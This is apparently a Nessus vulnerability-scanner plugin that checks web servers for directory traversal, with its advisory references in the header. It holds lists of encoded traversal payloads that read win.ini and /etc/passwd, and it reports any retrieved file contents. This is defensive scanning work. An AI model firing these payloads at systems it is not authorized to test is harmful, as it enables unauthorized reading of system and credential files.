#
# (C) Tenable Network Security, Inc.
#

##############
# References:
##############
#
# Date: 25 Sep 2002 09:10:45 -0000
# Message-ID: <20020925091045.29313.qmail@mail.securityfocus.com>
# From: "DownBload" <downbload@hotmail.com>
# To: bugtraq@securityfocus.com
# Subject: IIL Advisory: Reverse traversal vulnerability in Monkey (0.1.4) HTTP server
#
# From: "David Endler" <dendler@idefense.com>
# To:vulnwatch@vulnwatch.org
# Date: Mon, 23 Sep 2002 16:41:19 -0400
# Subject: iDEFENSE Security Advisory 09.23.2002: Directory Traversal in Dino's Webserver
#
# From:"UkR security team^(TM)" <cuctema@ok.ru>
# Subject: advisory
# To: bugtraq@securityfocus.com
# Date: Thu, 05 Sep 2002 16:30:30 +0400
# Message-ID: <web-29288022@backend2.aha.ru>
#
# From: "Tamer Sahin" <ts@securityoffice.net>
# To: bugtraq@securityfocus.com
# Subject: Web Server 4D/eCommerce 3.5.3 Directory Traversal Vulnerability
# Date: Tue, 15 Jan 2002 00:36:26 +0200
# Affiliation: http://www.securityoffice.net
#
# From: "Alex Forkosh" <aforkosh@techie.com>
# To: bugtraq@securityfocus.com
# Subject: Viewing arbitrary file from the file system using Eshare Expressions 4 server
# Date: Tue, 5 Feb 2002 00:18:42 -0600
#
# Should also apply for BID 7308, 7378, 7362, 7544, 7715
#
# From:	"scrap" <webmaster@securiteinfo.com>
# To:	vulnwatch@vulnwatch.org
# Date:	Thu, 25 Sep 2003 23:19:34 +0200
# Subject: myServer 0.4.3 Directory Traversal Vulnerability
#
# http://www.zone-h.org/en/advisories/read/id=3645/
# http://aluigi.altervista.org/adv/dcam-adv.txt
#
# Also catches Bugtraq 26583 (PoC: "/..\..\..\..\..\..\winnt\win.ini")
#
#   From: VulnerabilityResearch@DigitalDefense.net
#   To: bugtraq@securityfocus.com
#   Date: Mon Nov 26 2007 - 06:53:01 CST
#   Subject: 2007-06 Sentinel Protection Server Directory Traversal
#
# Also catches BID 32412
#


include("compat.inc");

if(description)
{
 script_id(10297);

 script_version ("$Revision: 1.61 $");

 script_name(english: "Web Server Directory Traversal Arbitrary File Access");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It appears possible to read arbitrary files on the remote host outside
the web server's document directory using a specially-crafted URL.  An
unauthenticated attacker may be able to exploit this issue to access
sensitive information to aide in subsequent attacks." );
 script_set_attribute(attribute:"solution", value:
"Contact the vendor for an update, use a different product, or disable
the service altogether." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();

 script_summary(english: "Tries to retrieve file outside document directory");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded:TRUE);

i=0;
r[i++] = '..\\..\\..\\..\\..\\..\\windows\\win.ini';
r[i++] = '..\\..\\..\\..\\..\\..\\winnt\\win.ini';
r[i++] = '/..\\..\\..\\..\\..\\..\\windows\\win.ini';
r[i++] = '/..\\..\\..\\..\\..\\..\\winnt\\win.ini';
r[i++] = '/%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini';
r[i++] = '/%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin.ini';
r[i++] = '/%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin%2eini';
r[i++] = '/%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin%2eini';
r[i++] = '/%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini';
r[i++] = '/%2f..%2f..%2f..%2f..%2f..%2f..%2fwinnt%2fwin.ini';
r[i++] = '/.|./.|./.|./.|./.|./.|./.|./windows/win.ini';
r[i++] = '/.|./.|./.|./.|./.|./.|./.|./winnt/win.ini';
r[i++] = '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini';
r[i++] = '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini';
r[i++] = '/.../.../.../.../.../.../.../.../.../windows/win.ini';
r[i++] = '/.../.../.../.../.../.../.../.../.../winnt/win.ini';
r[i++] = '/././././././../../../../../windows/win.ini';
r[i++] = '/././././././../../../../../winnt/win.ini';
r[i++] = '.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/windows/win.ini';
r[i++] = '.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/winnt/win.ini';
r[i++] = '/nessus\\..\\..\\..\\..\\..\\..\\windows\\win.ini';
r[i++] = '/nessus\\..\\..\\..\\..\\..\\..\\winnt\\win.ini';
# Some web servers badly parse args under the form /path/file?arg=../../
r[i++] = '/scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini';
r[i++] = '/scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini';
r[i++] = '/scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini';
r[i++] = '/scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini';
r[i++] = 0;

for (i=0; r[i]; i++)
{
  if (check_win_dir_trav(port: port, url: r[i]))
  {
    if (report_verbosity)
    {
      url = r[i];
      exploit_url = build_url(port: port, qs:url);

      report = strcat(
        '\nNessus was able to retrieve the remote host\'s \'win.ini\' file using the\n',
        'following URL :\n\n',
        '  ', exploit_url, '\n'
      );
      if (report_verbosity >= 1)
      {
        res = http_send_recv3(port: port, method: 'GET', item:url);
	if (! isnull(res))
        report = strcat(
          report,
          '\nHere is its content :\n\n',
          res[2]
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    set_kb_item(name: strcat("www/", port, "/generic_traversal"), value: TRUE);
    exit(0);
  }
}

i=0;
r[i++] = '../../../../../../etc/passwd';
r[i++] = '/../../../../../../../../../etc/passwd';
r[i++] = '//../../../../../../../../../etc/passwd';
r[i++] = '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd';
r[i++] = '/././././././../../../../../etc/passwd';
# Some web servers badly parse args under the form /path/file?arg=../../
r[i++] = '/scripts/fake.cgi?arg=/dir/../../../../../../etc/passwd';
r[i++] = '/scripts/fake.cgi?arg=/dir/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd';
r[i++] = 0;

for (i = 0; r[i]; i++)
{
  url = r[i];
  res = http_send_recv3(port: port, method: 'GET', item:url);
  if (isnull(res)) exit(0);
  if (egrep(pattern: 'root:.*:0:[01]:', string: res[2]))
  {
    if (report_verbosity)
    {
      exploit_url = build_url(port:port, qs:url);

      report = strcat(
        '\nNessus was able to retrieve the remote host\'s password file using the\n',
        'following URL :\n\n',
        '  ', exploit_url, '\n'
      );
      if (report_verbosity >= 1)
      {
        report = strcat(
          report,
          '\nHere are its contents :\n\n',
          res[2]
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    set_kb_item(name: strcat("www/", port, "/generic_traversal"), value: TRUE);
    exit(0);
  }
}
